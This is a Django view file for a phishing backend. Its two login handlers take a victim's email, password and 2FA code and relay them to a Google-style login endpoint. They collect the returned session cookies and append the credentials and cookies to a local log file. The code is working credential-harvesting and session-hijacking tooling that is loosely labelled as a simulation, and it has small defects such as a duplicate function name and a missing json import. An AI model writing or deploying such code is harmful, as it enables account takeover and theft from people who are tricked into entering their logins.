import re
from django.shortcuts import render
import requests


from rest_framework.response import Response
from rest_framework import status


# Define the path to save the cookies log
COOKIES_LOG_PATH = "cookies_log.txt"


def save_cookies_to_file(cookies):
    """Save captured cookies to a text file for later inspection"""
    with open(COOKIES_LOG_PATH, "a") as f:
        # Format cookies as a JSON string to make it human-readable
        f.write(json.dumps(cookies, indent=4))
        f.write("\n" + "=" * 80 + "\n")  # Separator for clarity


def submit_login(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("email", "")
        password = request.data.get("password", "")

        if not email:
            errors["email"] = ["User Email is required."]
        elif not is_valid_email(email):
           errors['email'] = ['Valid email required.']

        if not password:
            errors["password"] = ["Password is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        # Simulate sending these credentials to the real website's login endpoint
        real_site_login_url = "https://account.google/login"
        response = requests.post(
            real_site_login_url, data={"email": email, "password": password}
        )

        if response.status_code == 200:
            # Step 2: Check if 2FA is required
            if "2FA required" in response.text:
                data["requires_2fa"] = True
                payload["message"] = "Successful"
                payload["data"] = data

                return Response(payload)

            # Step 3: If login is successful without 2FA, return cookies and redirect URL
            cookies = response.cookies.get_dict()
            redirect_url = (
                "https://gmail.com/inbox"  # The real website's dashboard
            )

            cookies_json = {
                "email":email,
                "password": password,
                "cookies": cookies
            }

            # Save cookies with email and password to file
            save_cookies_to_file(cookies_json)

            data["redirect_url"] = redirect_url
            data["cookies"] = cookies
        else:
            errors["email"] = ["Invalid login credentials."]


        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)


        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)






def submit_login(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("email", "")
        password = request.data.get("password", "")
        twofa_code = request.data.get("twofa_code", "")

        if not email:
            errors["email"] = ["User Email is required."]
        elif not is_valid_email(email):
           errors['email'] = ['Valid email required.']

        if not password:
            errors["password"] = ["Password is required."]

        if not twofa_code:
            errors["twofa_code"] = ["2FA is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        # Simulate sending the login + 2FA code to the real website's 2FA validation endpoint
        real_site_2fa_url = "https://account.google/2fa"
        response = requests.post(
            real_site_2fa_url, data={"email": email, "password": password,  '2fa_code': twofa_code}
        )

        if response.status_code == 200:

        # Step 2: If 2FA is valid, return session cookies and redirect URL
            cookies = response.cookies.get_dict()
            redirect_url = (
                "https://gmail.com/inbox"  # The real website's dashboard
            )

            cookies_json = {
                "email":email,
                "password": password,
                "cookies": cookies
            }

            # Save cookies with email and password to file
            save_cookies_to_file(cookies_json)

            data["redirect_url"] = redirect_url
            data["cookies"] = cookies
        else:
            errors["email"] = ["Invalid login credentials."]


        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)


        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)































def is_valid_email(email):
    # Regular expression pattern for basic email validation
    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'

    # Using re.match to check if the email matches the pattern
    if re.match(pattern, email):
        return True
    else:
        return False